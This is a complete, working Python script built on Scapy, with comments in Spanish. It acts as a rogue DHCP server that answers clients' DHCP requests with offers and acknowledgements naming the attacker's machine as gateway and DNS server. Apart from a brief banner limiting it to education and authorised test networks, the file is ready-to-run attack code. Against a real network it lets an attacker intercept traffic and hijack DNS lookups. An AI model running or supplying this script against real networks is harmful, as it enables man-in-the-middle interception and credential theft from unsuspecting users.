#!/usr/bin/env python3
"""
DHCP Rogue/Spoofing Attack
Este script actúa como un servidor DHCP malicioso (rogue) que responde
a solicitudes DHCP antes que el servidor legítimo, proporcionando
configuraciones maliciosas a los clientes.
"""

from scapy.all import *
import threading

class DHCPRogueServer:
    def __init__(self, interface="eth0", server_ip="192.168.10.100", 
                 gateway="192.168.10.100", dns="192.168.10.100",
                 subnet_mask="255.255.255.0", lease_time=86400):
        """
        Inicializa el servidor DHCP malicioso
        
        Args:
            interface: Interfaz de red
            server_ip: IP del servidor DHCP malicioso
            gateway: Gateway a ofrecer (puede ser el atacante)
            dns: Servidor DNS a ofrecer (puede ser el atacante)
            subnet_mask: Máscara de subred
            lease_time: Tiempo de concesión en segundos
        """
        self.interface = interface
        self.server_ip = server_ip
        self.gateway = gateway
        self.dns = dns
        self.subnet_mask = subnet_mask
        self.lease_time = lease_time
        self.ip_pool_start = 50
        self.ip_pool_counter = self.ip_pool_start
        self.network_prefix = ".".join(server_ip.split(".")[0:3])
        
        # Obtener MAC de la interfaz
        self.server_mac = get_if_hwaddr(interface)
        
        print(f"[*] Servidor DHCP Rogue configurado:")
        print(f"    Interfaz: {self.interface}")
        print(f"    MAC: {self.server_mac}")
        print(f"    IP Servidor: {self.server_ip}")
        print(f"    Gateway: {self.gateway}")
        print(f"    DNS: {self.dns}")
        print(f"    Máscara: {self.subnet_mask}")
        print(f"    Pool: {self.network_prefix}.{self.ip_pool_start}-254")
    
    def get_next_ip(self):
        """Obtiene la siguiente IP del pool"""
        ip = f"{self.network_prefix}.{self.ip_pool_counter}"
        self.ip_pool_counter += 1
        if self.ip_pool_counter > 254:
            self.ip_pool_counter = self.ip_pool_start
        return ip
    
    def handle_dhcp_packet(self, packet):
        """Procesa paquetes DHCP"""
        if DHCP in packet:
            dhcp_message_type = None
            for opt in packet[DHCP].options:
                if isinstance(opt, tuple) and opt[0] == "message-type":
                    dhcp_message_type = opt[1]
                    break
            
            # Responder a DHCP DISCOVER
            if dhcp_message_type == 1:  # DISCOVER
                self.send_dhcp_offer(packet)
            
            # Responder a DHCP REQUEST
            elif dhcp_message_type == 3:  # REQUEST
                self.send_dhcp_ack(packet)
    
    def send_dhcp_offer(self, discover_packet):
        """Envía DHCP OFFER en respuesta a DISCOVER"""
        client_mac = discover_packet[Ether].src
        xid = discover_packet[BOOTP].xid
        
        # Asignar IP del pool
        offered_ip = self.get_next_ip()
        
        print(f"[+] DISCOVER de {client_mac} -> Ofreciendo {offered_ip}")
        
        # Construir paquete OFFER
        dhcp_offer = (
            Ether(dst=client_mac, src=self.server_mac) /
            IP(src=self.server_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(
                op=2,  # BOOTREPLY
                xid=xid,
                yiaddr=offered_ip,
                siaddr=self.server_ip,
                chaddr=mac2str(client_mac)
            ) /
            DHCP(options=[
                ("message-type", "offer"),
                ("server_id", self.server_ip),
                ("lease_time", self.lease_time),
                ("subnet_mask", self.subnet_mask),
                ("router", self.gateway),
                ("name_server", self.dns),
                ("domain", "malicious.local"),
                "end"
            ])
        )
        
        sendp(dhcp_offer, iface=self.interface, verbose=False)
    
    def send_dhcp_ack(self, request_packet):
        """Envía DHCP ACK en respuesta a REQUEST"""
        client_mac = request_packet[Ether].src
        xid = request_packet[BOOTP].xid
        
        # Extraer IP solicitada
        requested_ip = None
        for opt in request_packet[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "requested_addr":
                requested_ip = opt[1]
                break
        
        if not requested_ip:
            requested_ip = self.get_next_ip()
        
        print(f"[+] REQUEST de {client_mac} -> ACK para {requested_ip}")
        
        # Construir paquete ACK
        dhcp_ack = (
            Ether(dst=client_mac, src=self.server_mac) /
            IP(src=self.server_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(
                op=2,  # BOOTREPLY
                xid=xid,
                yiaddr=requested_ip,
                siaddr=self.server_ip,
                chaddr=mac2str(client_mac)
            ) /
            DHCP(options=[
                ("message-type", "ack"),
                ("server_id", self.server_ip),
                ("lease_time", self.lease_time),
                ("subnet_mask", self.subnet_mask),
                ("router", self.gateway),
                ("name_server", self.dns),
                ("domain", "malicious.local"),
                "end"
            ])
        )
        
        sendp(dhcp_ack, iface=self.interface, verbose=False)
    
    def start(self):
        """Inicia el servidor DHCP rogue"""
        print(f"\n[*] Servidor DHCP Rogue iniciado - Esperando solicitudes...")
        print("[!] Presione Ctrl+C para detener\n")
        
        # Sniff de paquetes DHCP
        sniff(
            iface=self.interface,
            filter="udp and (port 67 or port 68)",
            prn=self.handle_dhcp_packet,
            store=0
        )

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(
        description="DHCP Rogue/Spoofing Server - Servidor DHCP malicioso"
    )
    parser.add_argument(
        "-i", "--interface",
        default="eth0",
        help="Interfaz de red (default: eth0)"
    )
    parser.add_argument(
        "-s", "--server-ip",
        default="192.168.10.100",
        help="IP del servidor DHCP rogue (default: 192.168.10.100)"
    )
    parser.add_argument(
        "-g", "--gateway",
        default="192.168.10.100",
        help="Gateway a ofrecer (default: 192.168.10.100)"
    )
    parser.add_argument(
        "-d", "--dns",
        default="192.168.10.100",
        help="DNS a ofrecer (default: 192.168.10.100)"
    )
    parser.add_argument(
        "-m", "--mask",
        default="255.255.255.0",
        help="Máscara de subred (default: 255.255.255.0)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("DHCP ROGUE/SPOOFING SERVER")
    print("=" * 60)
    print("ADVERTENCIA: Este script es solo para fines educativos")
    print("Úselo solo en redes de prueba autorizadas")
    print("=" * 60)
    
    try:
        server = DHCPRogueServer(
            interface=args.interface,
            server_ip=args.server_ip,
            gateway=args.gateway,
            dns=args.dns,
            subnet_mask=args.mask
        )
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Servidor DHCP Rogue detenido")
    except Exception as e:
        print(f"[ERROR] {e}")